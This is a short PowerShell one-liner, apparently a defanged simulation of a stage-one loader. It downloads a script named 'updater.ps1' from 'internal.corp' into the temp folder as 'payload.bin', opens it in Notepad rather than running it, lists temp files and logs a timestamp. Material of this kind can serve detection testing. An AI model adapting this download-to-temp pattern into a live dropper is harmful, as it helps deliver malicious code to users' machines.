
$Stage1Url = "https://internal.corp/updater.ps1"; $DownloadPath = "$env:TEMP\payload.bin"; (New-Object System.Net.WebClient).DownloadFile($Stage1Url, $DownloadPath); Start-Process -FilePath "notepad.exe" -ArgumentList $DownloadPath; Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3; Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
